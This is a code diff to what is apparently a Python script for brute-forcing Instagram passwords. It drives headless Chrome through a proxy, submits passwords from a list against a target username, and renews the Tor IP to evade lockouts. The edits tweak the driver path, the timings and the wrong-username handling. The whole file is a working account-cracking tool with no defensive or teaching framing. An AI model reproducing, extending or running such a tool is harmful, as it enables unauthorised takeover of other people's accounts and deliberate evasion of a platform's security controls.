@@ -84,7 +84,7 @@ options.add_argument('--proxy-server=%s' % PROXY)
 options.add_argument('headless')
 options.add_argument('--log-level=3')
 #Setting up the chromedriver
-driver = webdriver.Chrome(options=options, executable_path=r'C:/webdrivers/chromedriver.exe') # <<<< EDIT this according to your directory
+driver = webdriver.Chrome(options=options, executable_path=r'chromedriver.exe') 
 
 #Making variables for incrementation, in the for loop
 a = 0
@@ -97,7 +97,6 @@ banner()
 print("Target: {} || Password List: {} || List length: {}".format(uname, passlist, file_length(str(passlist))))
 time.sleep(5)
 os.system(ops)
-
 # Main Loop
 while True:
     n += 1
@@ -112,7 +111,7 @@ while True:
         options.add_argument('headless')
         options.add_argument('--log-level=3')
         #Setting up the chromedriver
-        driver = webdriver.Chrome(options=options, executable_path=r'C:/webdrivers/chromedriver.exe') # <<<< EDIT this according to your directory
+        driver = webdriver.Chrome(options=options, executable_path=r'chromedriver.exe') 
         print("\n")
         print("This IP was used 9 times")
         print("Getting new IP...")
@@ -144,7 +143,7 @@ while True:
 
     #Navigating to Instagram login page
     driver.get('https://www.instagram.com/accounts/login/')
-    time.sleep(5)
+    time.sleep(10)
 
     #Finding the username and password boxes
     username = driver.find_element_by_name("username")
@@ -162,9 +161,9 @@ while True:
     #Submitting, the password and the username
     submit = driver.find_element_by_class_name('sqdOP.L3NKy.y3zKF')
     submit.click()
-    time.sleep(11)
+    time.sleep(10)
 
-######################  Login Detection  ####################
+######################  Login Detection  ######### ############
 
     if "incorrect" in driver.page_source:
         print("Wrong password, no match")
@@ -190,6 +189,12 @@ while True:
         print("Requesting new one")
         time.sleep(10)
         renew_tor_ip()
+
+    elif "The username you entered doesn't belong to an account." in driver.page_source:
+        print("\n")
+        print("WRONG USERNAME")
+        print("Check the username, and run the script again")
+        sys.exit()
 
     elif 'There was a problem logging you into Instagram' in driver.page_source:
         for t in range(2):
@@ -235,12 +240,6 @@ while True:
             a -= 1
             b -= 1
             renew_tor_ip()
-
-        elif "The username you entered doesn't belong to an account." in driver.page_source:
-            print("\n")
-            print("WRONG USERNAME")
-            print("Check the username, and run the script again")
-            sys.exit()
 
         elif 'class="no-js logged-in' in driver.page_source:
             print("\n")
